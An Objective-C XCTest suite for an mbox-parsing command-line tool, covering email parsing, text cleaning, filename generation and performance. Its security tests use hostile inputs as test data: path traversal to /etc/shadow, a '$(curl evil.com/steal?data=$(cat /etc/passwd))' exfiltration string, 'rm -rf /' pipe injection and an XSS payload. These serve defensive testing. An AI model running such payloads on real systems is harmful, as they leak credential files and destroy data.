//
//  MboxChatCLIComprehensiveTests.m
//  MboxChatCLITests
//
//  Comprehensive test suite covering unit, security, integration,
//  functional, and framework tests for MboxChatCLI.
//
//  Written by Jordan Koch
//

#import <XCTest/XCTest.h>
#import "Email.h"
#import "TextProcessor.h"
#import "FilenameGenerator.h"

// Expose C functions from main.m for testing
extern BOOL isClearText(NSString *str);
extern NSString *stripNonASCII(NSString *input);
extern NSString *removeAttachmentsAndRTF(NSString *body);
extern NSString *safeExportFilename(NSString *subject, NSUInteger threadNum);
extern NSString *safeWriteFilename(NSUInteger msgNum);
extern NSString *safeSummaryFilename(NSString *subject, NSUInteger threadNum);
extern NSArray<Email *> *parseMbox(NSString *path);
extern NSString *trim(NSString *str);
extern BOOL ensureDirectoryExists(NSString *dirPath);
extern NSString *firstSentence(NSArray<Email *> *thread);
extern NSString *lastSentence(NSArray<Email *> *thread);
extern void writeMessagesToDirectory(NSArray<Email *> *emails, NSString *dirPath);
extern void writeThreadsToDirectory(NSArray<Email *> *emails, NSString *dirPath);
extern void summarizeEmailsToDirectory(NSArray<Email *> *emails, NSString *dirPath);

#pragma mark - Email Model Advanced Unit Tests

@interface EmailModelAdvancedTests : XCTestCase
@end

@implementation EmailModelAdvancedTests

- (void)testEmailInitWithLongSubject {
    NSMutableString *longSubject = [NSMutableString string];
    for (int i = 0; i < 1000; i++) {
        [longSubject appendString:@"A"];
    }
    Email *e = [[Email alloc] initWithFrom:@"test@test.com"
                                   subject:longSubject
                                      date:@"2024-01-01"
                                      body:@"Body"];
    XCTAssertEqual(e.subject.length, 1000);
}

- (void)testEmailInitWithUnicodeContent {
    Email *e = [[Email alloc] initWithFrom:@"user@example.com"
                                   subject:@"Re: Meeting"
                                      date:@"2024-01-01"
                                      body:@"Rendez-vous demain"];
    XCTAssertEqualObjects(e.body, @"Rendez-vous demain");
}

- (void)testEmailInitWithEmptyStrings {
    Email *e = [[Email alloc] initWithFrom:@"" subject:@"" date:@"" body:@""];
    XCTAssertEqualObjects(e.from, @"");
    XCTAssertEqualObjects(e.subject, @"");
    XCTAssertEqualObjects(e.date, @"");
    XCTAssertEqualObjects(e.body, @"");
}

- (void)testEmailCopyPropertySemantics_subject {
    NSMutableString *mutableSubject = [NSMutableString stringWithString:@"Original Subject"];
    Email *e = [[Email alloc] initWithFrom:nil subject:mutableSubject date:nil body:nil];
    [mutableSubject appendString:@" Modified"];
    XCTAssertEqualObjects(e.subject, @"Original Subject",
                          @"subject property should be a copy");
}

- (void)testEmailCopyPropertySemantics_body {
    NSMutableString *mutableBody = [NSMutableString stringWithString:@"Original Body"];
    Email *e = [[Email alloc] initWithFrom:nil subject:nil date:nil body:mutableBody];
    [mutableBody appendString:@" Modified"];
    XCTAssertEqualObjects(e.body, @"Original Body",
                          @"body property should be a copy");
}

- (void)testEmailCopyPropertySemantics_date {
    NSMutableString *mutableDate = [NSMutableString stringWithString:@"2024-01-01"];
    Email *e = [[Email alloc] initWithFrom:nil subject:nil date:mutableDate body:nil];
    [mutableDate appendString:@" extra"];
    XCTAssertEqualObjects(e.date, @"2024-01-01",
                          @"date property should be a copy");
}

- (void)testEmailDescriptionFormat {
    Email *e = [[Email alloc] initWithFrom:@"alice@test.com"
                                   subject:@"Hello"
                                      date:@"2024-01-01"
                                      body:@"Body text"];
    NSString *desc = [e description];
    XCTAssertTrue([desc hasPrefix:@"<Email "]);
    XCTAssertTrue([desc hasSuffix:@">"]);
}

- (void)testEmailWithNewlinesInBody {
    NSString *body = @"Line 1\nLine 2\nLine 3\r\nLine 4";
    Email *e = [[Email alloc] initWithFrom:@"test@test.com"
                                   subject:@"Test"
                                      date:@"2024-01-01"
                                      body:body];
    XCTAssertTrue([e.body containsString:@"\n"]);
}

@end

#pragma mark - TextProcessor Advanced Unit Tests

@interface TextProcessorAdvancedTests : XCTestCase
@end

@implementation TextProcessorAdvancedTests

- (void)testIsClearTextWithControlCharacters {
    // Form feed (0x0C) should be rejected
    NSString *withFF = @"Hello\x0CWorld";
    XCTAssertFalse([TextProcessor isClearText:withFF]);
}

- (void)testIsClearTextWithNullByte {
    NSString *withNull = @"Hello\0World";
    // Depending on string handling, may truncate or reject
    if (withNull.length > 5) { // If the full string was captured
        XCTAssertFalse([TextProcessor isClearText:withNull]);
    }
}

- (void)testIsClearTextWithAllPrintableASCII {
    // All printable ASCII characters 0x20 to 0x7E
    NSMutableString *allPrintable = [NSMutableString string];
    for (unichar c = 0x20; c <= 0x7E; c++) {
        [allPrintable appendFormat:@"%C", c];
    }
    XCTAssertTrue([TextProcessor isClearText:allPrintable]);
}

- (void)testStripNonASCIIWithEmoji {
    NSString *input = @"Hello World";
    NSString *result = [TextProcessor stripNonASCII:input];
    XCTAssertEqualObjects(result, @"Hello World");
}

- (void)testStripNonASCIIPreservesNumbers {
    NSString *result = [TextProcessor stripNonASCII:@"Price: $100.50 (USD)"];
    XCTAssertEqualObjects(result, @"Price: $100.50 (USD)");
}

- (void)testStripNonASCIIWithCJKCharacters {
    NSString *input = @"Mixed English and CJK";
    NSString *result = [TextProcessor stripNonASCII:input];
    XCTAssertEqualObjects(result, @"Mixed English and CJK");
}

- (void)testRemoveRTFContentPreservesPlainText {
    NSString *body = @"This is plain text.\nNo special content here.";
    NSString *result = [TextProcessor removeAttachmentsAndRTF:body];
    XCTAssertEqualObjects(result, body);
}

- (void)testRemoveMultipleRTFSections {
    NSString *body = @"Normal\nContent-Type: application/rtf\nRTF1\n--\nBetween\nContent-Type: application/rtf\nRTF2\n--\nEnd";
    NSString *result = [TextProcessor removeAttachmentsAndRTF:body];
    XCTAssertTrue([result containsString:@"Normal"]);
    XCTAssertFalse([result containsString:@"RTF1"]);
    XCTAssertFalse([result containsString:@"RTF2"]);
}

- (void)testTrimWithOnlyWhitespace {
    XCTAssertEqualObjects([TextProcessor trim:@"   \t\n   "], @"");
}

- (void)testTrimWithNoWhitespace {
    XCTAssertEqualObjects([TextProcessor trim:@"hello"], @"hello");
}

- (void)testFirstSentenceSkipsShort {
    NSString *text = @"Hi. Yes. OK. This sentence is long enough to qualify.";
    NSString *result = [TextProcessor firstSentenceFromText:text];
    XCTAssertEqualObjects(result, @"This sentence is long enough to qualify");
}

- (void)testLastSentenceSkipsShort {
    NSString *text = @"This is a reasonable sentence. OK. Hi.";
    NSString *result = [TextProcessor lastSentenceFromText:text];
    XCTAssertEqualObjects(result, @"This is a reasonable sentence");
}

- (void)testFirstSentenceWithExclamation {
    NSString *text = @"No! This is important information here!";
    NSString *result = [TextProcessor firstSentenceFromText:text];
    XCTAssertEqualObjects(result, @"This is important information here");
}

- (void)testLastSentenceWithQuestion {
    NSString *text = @"Can we schedule the meeting? When would be good for everyone?";
    NSString *result = [TextProcessor lastSentenceFromText:text];
    XCTAssertTrue(result.length > 8);
}

- (void)testFirstSentenceFromNil {
    XCTAssertEqualObjects([TextProcessor firstSentenceFromText:nil], @"");
}

- (void)testLastSentenceFromNil {
    XCTAssertEqualObjects([TextProcessor lastSentenceFromText:nil], @"");
}

@end

#pragma mark - FilenameGenerator Advanced Unit Tests

@interface FilenameGeneratorAdvancedTests : XCTestCase
@end

@implementation FilenameGeneratorAdvancedTests

- (void)testSafeWriteFilenameZero {
    XCTAssertEqualObjects([FilenameGenerator safeWriteFilename:0], @"message0000.txt");
}

- (void)testSafeWriteFilenameLargeNumber {
    NSString *result = [FilenameGenerator safeWriteFilename:100000];
    XCTAssertTrue([result hasPrefix:@"message"]);
    XCTAssertTrue([result hasSuffix:@".txt"]);
}

- (void)testSafeExportFilenameWithNilSubject {
    // Test the C function which handles nil differently
    NSString *result = safeExportFilename(@"", 42);
    XCTAssertTrue([result containsString:@"thread0042"]);
}

- (void)testSafeExportFilenameConsistency {
    NSString *r1 = [FilenameGenerator safeExportFilename:@"Test Subject" threadNumber:1];
    NSString *r2 = [FilenameGenerator safeExportFilename:@"Test Subject" threadNumber:1];
    XCTAssertEqualObjects(r1, r2, @"Same input should produce same output");
}

- (void)testSafeSummaryFilenameConsistency {
    NSString *r1 = [FilenameGenerator safeSummaryFilename:@"Topic" threadNumber:5];
    NSString *r2 = [FilenameGenerator safeSummaryFilename:@"Topic" threadNumber:5];
    XCTAssertEqualObjects(r1, r2);
}

- (void)testSanitizeForFilenameRemovesSlashes {
    NSString *result = [FilenameGenerator sanitizeForFilename:@"path/to/file"];
    XCTAssertFalse([result containsString:@"/"]);
}

- (void)testSanitizeForFilenameRemovesBackslashes {
    NSString *result = [FilenameGenerator sanitizeForFilename:@"C:\\Users\\test"];
    XCTAssertFalse([result containsString:@"\\"]);
}

- (void)testSanitizeForFilenameRemovesColons {
    NSString *result = [FilenameGenerator sanitizeForFilename:@"Re: Important: Update"];
    XCTAssertFalse([result containsString:@":"]);
}

- (void)testSanitizeForFilenameRemovesAngleBrackets {
    NSString *result = [FilenameGenerator sanitizeForFilename:@"<html>content</html>"];
    XCTAssertFalse([result containsString:@"<"]);
    XCTAssertFalse([result containsString:@">"]);
}

- (void)testSanitizeForFilenameRemovesQuotes {
    NSString *result = [FilenameGenerator sanitizeForFilename:@"She said \"hello\""];
    XCTAssertFalse([result containsString:@"\""]);
}

- (void)testSanitizeForFilenamePreservesUnderscores {
    NSString *result = [FilenameGenerator sanitizeForFilename:@"my_file_name"];
    XCTAssertTrue([result containsString:@"my_file_name"]);
}

- (void)testSanitizeForFilenamePreservesDashes {
    NSString *result = [FilenameGenerator sanitizeForFilename:@"my-file-name"];
    XCTAssertTrue([result containsString:@"my-file-name"]);
}

@end

#pragma mark - Security Tests

@interface MboxSecurityAdvancedTests : XCTestCase
@end

@implementation MboxSecurityAdvancedTests

- (void)testPathTraversalMultipleLevels {
    NSString *malicious = @"../../../../etc/shadow";
    NSString *result = [FilenameGenerator sanitizeForFilename:malicious];
    XCTAssertFalse([result containsString:@"/"]);
}

- (void)testSymlinkPathInFilename {
    NSString *symlink = @"/tmp/../../etc/passwd";
    NSString *result = [FilenameGenerator sanitizeForFilename:symlink];
    XCTAssertFalse([result containsString:@"/"]);
}

- (void)testCommandInjectionInSubject {
    NSString *evil = @"$(curl evil.com/steal?data=$(cat /etc/passwd))";
    NSString *result = [FilenameGenerator safeExportFilename:evil threadNumber:1];
    // The filename should not execute commands
    XCTAssertNotNil(result);
    XCTAssertTrue(result.length > 0);
}

- (void)testPipeInjectionInSubject {
    NSString *evil = @"normal | rm -rf /";
    NSString *result = [FilenameGenerator sanitizeForFilename:evil];
    XCTAssertFalse([result containsString:@"|"]);
}

- (void)testHTMLInjectionInFilename {
    NSString *html = @"<img src=x onerror=alert(1)>";
    NSString *result = [FilenameGenerator sanitizeForFilename:html];
    XCTAssertFalse([result containsString:@"<"]);
    XCTAssertFalse([result containsString:@">"]);
}

- (void)testClearTextRejectsDELCharacter {
    // DEL (0x7F) should be rejected
    NSString *withDEL = @"Hello\x7FWorld";
    XCTAssertFalse([TextProcessor isClearText:withDEL]);
}

- (void)testClearTextRejectsBellCharacter {
    // BEL (0x07) should be rejected
    NSString *withBEL = @"Hello\x07World";
    XCTAssertFalse([TextProcessor isClearText:withBEL]);
}

- (void)testLargeInputDoesNotCrash {
    // Create a very large string (1MB)
    NSMutableString *large = [NSMutableString string];
    for (int i = 0; i < 100000; i++) {
        [large appendString:@"ABCDEFGHIJ"];
    }
    XCTAssertEqual(large.length, 1000000);

    // These should handle large input gracefully
    XCTAssertTrue([TextProcessor isClearText:large]);
    NSString *stripped = [TextProcessor stripNonASCII:large];
    XCTAssertEqual(stripped.length, 1000000);
}

- (void)testFilenameWithOnlyForbiddenChars {
    NSString *onlyForbidden = @"/\\:?%*|\"<>'";
    NSString *result = [FilenameGenerator sanitizeForFilename:onlyForbidden];
    // Should be all underscores now
    for (NSUInteger i = 0; i < result.length; i++) {
        unichar c = [result characterAtIndex:i];
        XCTAssertEqual(c, '_', @"All characters should be replaced with underscores");
    }
}

- (void)testParseMboxWithMalformedHeaders {
    NSString *tmpPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"malformed.mbox"];
    NSString *content = @"From bad\nNotAHeader: value\n\nBody here\n";
    [content writeToFile:tmpPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    NSArray<Email *> *emails = parseMbox(tmpPath);
    // Should not crash; may or may not parse emails
    XCTAssertNotNil(emails);

    [[NSFileManager defaultManager] removeItemAtPath:tmpPath error:nil];
}

- (void)testParseMboxWithBinaryContent {
    NSString *tmpPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"binary.mbox"];
    NSString *content = @"From sender\nFrom: test@test.com\nSubject: Binary\n\n\x01\x02\x03\x04\x05\n";
    [content writeToFile:tmpPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    NSArray<Email *> *emails = parseMbox(tmpPath);
    // Binary emails should be filtered out by isClearText check
    XCTAssertNotNil(emails);

    [[NSFileManager defaultManager] removeItemAtPath:tmpPath error:nil];
}

@end

#pragma mark - Integration Tests

@interface MboxIntegrationTests : XCTestCase
@property (nonatomic, strong) NSString *testDir;
@property (nonatomic, strong) NSString *testMboxPath;
@end

@implementation MboxIntegrationTests

- (void)setUp {
    [super setUp];
    self.testDir = [NSTemporaryDirectory() stringByAppendingPathComponent:
                    [NSString stringWithFormat:@"mboxtest_%u", arc4random()]];
    [[NSFileManager defaultManager] createDirectoryAtPath:self.testDir
                              withIntermediateDirectories:YES attributes:nil error:nil];

    self.testMboxPath = [self.testDir stringByAppendingPathComponent:@"test.mbox"];
    NSString *mboxContent =
        @"From alice@test.com Mon Jan 01 00:00:00 2024\n"
        @"From: alice@test.com\n"
        @"Subject: Project Status\n"
        @"Date: Mon, 01 Jan 2024 00:00:00 -0800\n"
        @"\n"
        @"The project is on track. We completed phase one this week.\n"
        @"\n"
        @"From bob@test.com Tue Jan 02 00:00:00 2024\n"
        @"From: bob@test.com\n"
        @"Subject: Re: Project Status\n"
        @"Date: Tue, 02 Jan 2024 10:00:00 -0800\n"
        @"\n"
        @"Great work team. Let us start phase two next Monday.\n"
        @"\n"
        @"From carol@test.com Wed Jan 03 00:00:00 2024\n"
        @"From: carol@test.com\n"
        @"Subject: Budget Review\n"
        @"Date: Wed, 03 Jan 2024 14:00:00 -0800\n"
        @"\n"
        @"Please review the attached budget spreadsheet for Q1.\n";

    [mboxContent writeToFile:self.testMboxPath atomically:YES
                    encoding:NSUTF8StringEncoding error:nil];
}

- (void)tearDown {
    [[NSFileManager defaultManager] removeItemAtPath:self.testDir error:nil];
    [super tearDown];
}

- (void)testParseMboxThreeEmails {
    NSArray<Email *> *emails = parseMbox(self.testMboxPath);
    XCTAssertEqual(emails.count, 3);
}

- (void)testParseMboxHeaderExtraction {
    NSArray<Email *> *emails = parseMbox(self.testMboxPath);
    XCTAssertGreaterThan(emails.count, 0);

    Email *first = emails.firstObject;
    XCTAssertTrue([first.from containsString:@"alice@test.com"]);
    XCTAssertTrue([first.subject containsString:@"Project Status"]);
    XCTAssertNotNil(first.date);
}

- (void)testParseMboxBodyExtraction {
    NSArray<Email *> *emails = parseMbox(self.testMboxPath);
    XCTAssertGreaterThan(emails.count, 0);

    Email *first = emails.firstObject;
    XCTAssertTrue([first.body containsString:@"on track"]);
}

- (void)testWriteMessagesToDirectory {
    NSArray<Email *> *emails = parseMbox(self.testMboxPath);
    NSString *outputDir = [self.testDir stringByAppendingPathComponent:@"messages"];

    writeMessagesToDirectory(emails, outputDir);

    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:outputDir error:nil];
    XCTAssertEqual(files.count, 3);

    // Verify message filenames
    XCTAssertTrue([files containsObject:@"message0001.txt"]);
    XCTAssertTrue([files containsObject:@"message0002.txt"]);
    XCTAssertTrue([files containsObject:@"message0003.txt"]);
}

- (void)testWriteMessagesContent {
    NSArray<Email *> *emails = parseMbox(self.testMboxPath);
    NSString *outputDir = [self.testDir stringByAppendingPathComponent:@"messages"];

    writeMessagesToDirectory(emails, outputDir);

    NSString *firstFile = [outputDir stringByAppendingPathComponent:@"message0001.txt"];
    NSString *content = [NSString stringWithContentsOfFile:firstFile
                                                 encoding:NSASCIIStringEncoding
                                                    error:nil];
    XCTAssertTrue([content containsString:@"From:"]);
    XCTAssertTrue([content containsString:@"Subject:"]);
}

- (void)testWriteThreadsToDirectory {
    NSArray<Email *> *emails = parseMbox(self.testMboxPath);
    NSString *outputDir = [self.testDir stringByAppendingPathComponent:@"threads"];

    writeThreadsToDirectory(emails, outputDir);

    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:outputDir error:nil];
    // Two unique subjects: "Project Status" / "Re: Project Status" threads and "Budget Review"
    XCTAssertGreaterThan(files.count, 0);

    // All files should start with "export"
    for (NSString *file in files) {
        XCTAssertTrue([file hasPrefix:@"export "], @"Thread files should have 'export ' prefix");
    }
}

- (void)testSummarizeEmailsToDirectory {
    NSArray<Email *> *emails = parseMbox(self.testMboxPath);
    NSString *outputDir = [self.testDir stringByAppendingPathComponent:@"summaries"];

    summarizeEmailsToDirectory(emails, outputDir);

    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:outputDir error:nil];
    XCTAssertGreaterThan(files.count, 0);

    // All files should start with "summary"
    for (NSString *file in files) {
        XCTAssertTrue([file hasPrefix:@"summary "], @"Summary files should have 'summary ' prefix");
    }
}

- (void)testSummaryContentStructure {
    NSArray<Email *> *emails = parseMbox(self.testMboxPath);
    NSString *outputDir = [self.testDir stringByAppendingPathComponent:@"summaries2"];

    summarizeEmailsToDirectory(emails, outputDir);

    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:outputDir error:nil];
    XCTAssertGreaterThan(files.count, 0);

    NSString *firstSummary = [outputDir stringByAppendingPathComponent:files.firstObject];
    NSString *content = [NSString stringWithContentsOfFile:firstSummary
                                                 encoding:NSASCIIStringEncoding
                                                    error:nil];
    XCTAssertTrue([content containsString:@"Subject:"]);
    XCTAssertTrue([content containsString:@"Thread length:"]);
    XCTAssertTrue([content containsString:@"From:"]);
}

- (void)testEnsureDirectoryCreatesNested {
    NSString *nestedPath = [self.testDir stringByAppendingPathComponent:@"a/b/c/d"];
    BOOL result = ensureDirectoryExists(nestedPath);
    XCTAssertTrue(result);

    BOOL isDir;
    XCTAssertTrue([[NSFileManager defaultManager] fileExistsAtPath:nestedPath isDirectory:&isDir]);
    XCTAssertTrue(isDir);
}

- (void)testEnsureDirectoryExistingDir {
    // Should succeed for already existing directory
    BOOL result = ensureDirectoryExists(self.testDir);
    XCTAssertTrue(result);
}

@end

#pragma mark - Functional Thread Tests

@interface MboxThreadFunctionalTests : XCTestCase
@end

@implementation MboxThreadFunctionalTests

- (void)testFirstSentenceFromMultiEmailThread {
    Email *e1 = [[Email alloc] initWithFrom:@"a@b.com" subject:@"Test"
                                       date:@"2024-01-01"
                                       body:@"Hi. This is a long enough opening message for the thread."];
    Email *e2 = [[Email alloc] initWithFrom:@"b@c.com" subject:@"Re: Test"
                                       date:@"2024-01-02"
                                       body:@"Thanks for the detailed information."];

    NSArray *thread = @[e1, e2];
    NSString *result = firstSentence(thread);
    XCTAssertTrue(result.length > 8);
}

- (void)testLastSentenceFromMultiEmailThread {
    Email *e1 = [[Email alloc] initWithFrom:@"a@b.com" subject:@"Test"
                                       date:@"2024-01-01"
                                       body:@"The beginning of our conversation."];
    Email *e2 = [[Email alloc] initWithFrom:@"b@c.com" subject:@"Re: Test"
                                       date:@"2024-01-02"
                                       body:@"OK. This is the last reply in the thread here!"];

    NSArray *thread = @[e1, e2];
    NSString *result = lastSentence(thread);
    XCTAssertTrue(result.length > 8);
}

- (void)testFirstSentenceSkipsEmptyBodies {
    Email *empty = [[Email alloc] initWithFrom:@"a@b.com" subject:@"Test"
                                          date:@"2024-01-01" body:@""];
    Email *valid = [[Email alloc] initWithFrom:@"b@c.com" subject:@"Re: Test"
                                          date:@"2024-01-02"
                                          body:@"This is a valid reply with content."];

    NSArray *thread = @[empty, valid];
    NSString *result = firstSentence(thread);
    XCTAssertTrue(result.length > 8);
}

- (void)testLastSentenceWithNilBodies {
    Email *e = [[Email alloc] init];
    e.from = @"test@test.com";
    // body is nil

    NSArray *thread = @[e];
    NSString *result = lastSentence(thread);
    XCTAssertEqualObjects(result, @"");
}

- (void)testFirstSentenceOnlyShortSentences {
    Email *e = [[Email alloc] initWithFrom:@"a@b.com" subject:@"Test"
                                      date:@"2024-01-01" body:@"Hi. OK. Yes. No."];
    NSArray *thread = @[e];
    NSString *result = firstSentence(thread);
    XCTAssertEqualObjects(result, @"");
}

@end

#pragma mark - MBOX Parsing Edge Cases

@interface MboxParsingEdgeCases : XCTestCase
@end

@implementation MboxParsingEdgeCases

- (void)testParseMboxWithNoBody {
    NSString *tmpPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"nobody.mbox"];
    NSString *content = @"From sender@test.com Mon Jan 01 00:00:00 2024\n"
                        @"From: alice@test.com\n"
                        @"Subject: No Body Email\n"
                        @"Date: Mon, 01 Jan 2024\n"
                        @"\n";
    [content writeToFile:tmpPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    NSArray<Email *> *emails = parseMbox(tmpPath);
    XCTAssertGreaterThan(emails.count, 0);

    Email *first = emails.firstObject;
    XCTAssertEqualObjects(first.subject, @"No Body Email");

    [[NSFileManager defaultManager] removeItemAtPath:tmpPath error:nil];
}

- (void)testParseMboxWithOnlySender {
    NSString *tmpPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"sender_only.mbox"];
    NSString *content = @"From sender@test.com Mon Jan 01 00:00:00 2024\n"
                        @"From: justasender@test.com\n"
                        @"\n"
                        @"Some body text here.\n";
    [content writeToFile:tmpPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    NSArray<Email *> *emails = parseMbox(tmpPath);
    XCTAssertGreaterThan(emails.count, 0);
    XCTAssertTrue([emails.firstObject.from containsString:@"justasender"]);

    [[NSFileManager defaultManager] removeItemAtPath:tmpPath error:nil];
}

- (void)testParseMboxLargeFile {
    NSString *tmpPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"large.mbox"];
    NSMutableString *content = [NSMutableString string];

    for (int i = 0; i < 100; i++) {
        [content appendFormat:@"From sender%d@test.com Mon Jan 01 00:00:00 2024\n", i];
        [content appendFormat:@"From: sender%d@test.com\n", i];
        [content appendFormat:@"Subject: Email Number %d\n", i];
        [content appendString:@"Date: Mon, 01 Jan 2024\n"];
        [content appendString:@"\n"];
        [content appendFormat:@"This is the body of email number %d.\n", i];
        [content appendString:@"\n"];
    }

    [content writeToFile:tmpPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    NSArray<Email *> *emails = parseMbox(tmpPath);
    XCTAssertEqual(emails.count, 100);

    [[NSFileManager defaultManager] removeItemAtPath:tmpPath error:nil];
}

- (void)testParseMboxPreservesWhitespaceInBody {
    NSString *tmpPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"whitespace.mbox"];
    NSString *content = @"From sender@test.com Mon Jan 01 00:00:00 2024\n"
                        @"From: alice@test.com\n"
                        @"Subject: Whitespace Test\n"
                        @"\n"
                        @"  Indented line\n"
                        @"    Double indented\n"
                        @"Normal line\n";
    [content writeToFile:tmpPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    NSArray<Email *> *emails = parseMbox(tmpPath);
    XCTAssertGreaterThan(emails.count, 0);
    XCTAssertTrue([emails.firstObject.body containsString:@"  Indented line"]);

    [[NSFileManager defaultManager] removeItemAtPath:tmpPath error:nil];
}

@end

#pragma mark - C Function vs Class Method Parity Tests

@interface CFunctionParityTests : XCTestCase
@end

@implementation CFunctionParityTests

- (void)testIsClearTextParity {
    NSString *ascii = @"Hello World 123";
    XCTAssertEqual(isClearText(ascii), [TextProcessor isClearText:ascii]);

    NSString *binary = @"Hello\x01World";
    XCTAssertEqual(isClearText(binary), [TextProcessor isClearText:binary]);
}

- (void)testStripNonASCIIParity {
    NSString *input = @"Hello World 123";
    NSString *cResult = stripNonASCII(input);
    NSString *classResult = [TextProcessor stripNonASCII:input];
    XCTAssertEqualObjects(cResult, classResult);
}

- (void)testTrimParity {
    NSString *input = @"  hello  ";
    NSString *cResult = trim(input);
    NSString *classResult = [TextProcessor trim:input];
    XCTAssertEqualObjects(cResult, classResult);
}

- (void)testSafeWriteFilenameParity {
    NSString *cResult = safeWriteFilename(42);
    NSString *classResult = [FilenameGenerator safeWriteFilename:42];
    XCTAssertEqualObjects(cResult, classResult);
}

- (void)testSafeExportFilenameParity {
    NSString *cResult = safeExportFilename(@"Test Subject", 1);
    NSString *classResult = [FilenameGenerator safeExportFilename:@"Test Subject" threadNumber:1];
    XCTAssertEqualObjects(cResult, classResult);
}

- (void)testSafeSummaryFilenameParity {
    NSString *cResult = safeSummaryFilename(@"Test Subject", 1);
    NSString *classResult = [FilenameGenerator safeSummaryFilename:@"Test Subject" threadNumber:1];
    XCTAssertEqualObjects(cResult, classResult);
}

@end

#pragma mark - Performance Tests

@interface MboxPerformanceTests : XCTestCase
@end

@implementation MboxPerformanceTests

- (void)testTextProcessorPerformance_isClearText {
    NSString *largeText = [@"" stringByPaddingToLength:10000 withString:@"Hello World " startingAtIndex:0];
    [self measureBlock:^{
        for (int i = 0; i < 1000; i++) {
            (void)[TextProcessor isClearText:largeText];
        }
    }];
}

- (void)testTextProcessorPerformance_stripNonASCII {
    NSString *mixedText = [@"" stringByPaddingToLength:10000 withString:@"Hello World " startingAtIndex:0];
    [self measureBlock:^{
        for (int i = 0; i < 1000; i++) {
            (void)[TextProcessor stripNonASCII:mixedText];
        }
    }];
}

- (void)testFilenameGeneratorPerformance {
    [self measureBlock:^{
        for (NSUInteger i = 0; i < 10000; i++) {
            (void)[FilenameGenerator safeExportFilename:@"Test Subject Line"
                                           threadNumber:i];
        }
    }];
}

- (void)testMboxParsingPerformance {
    // Create a temporary mbox with 50 emails
    NSString *tmpPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"perf.mbox"];
    NSMutableString *content = [NSMutableString string];
    for (int i = 0; i < 50; i++) {
        [content appendFormat:@"From sender%d@test.com Mon Jan 01 00:00:00 2024\n", i];
        [content appendFormat:@"From: sender%d@test.com\n", i];
        [content appendFormat:@"Subject: Performance Test Email %d\n", i];
        [content appendString:@"Date: Mon, 01 Jan 2024\n\n"];
        [content appendFormat:@"This is the body of performance test email %d. It contains enough text to be meaningful.\n\n", i];
    }
    [content writeToFile:tmpPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    [self measureBlock:^{
        NSArray<Email *> *emails = parseMbox(tmpPath);
        XCTAssertEqual(emails.count, 50);
    }];

    [[NSFileManager defaultManager] removeItemAtPath:tmpPath error:nil];
}

- (void)testSanitizeForFilenamePerformance {
    [self measureBlock:^{
        for (int i = 0; i < 10000; i++) {
            (void)[FilenameGenerator sanitizeForFilename:@"Re: Fw: Important: <Action Required> - Meeting/Schedule?"];
        }
    }];
}

@end
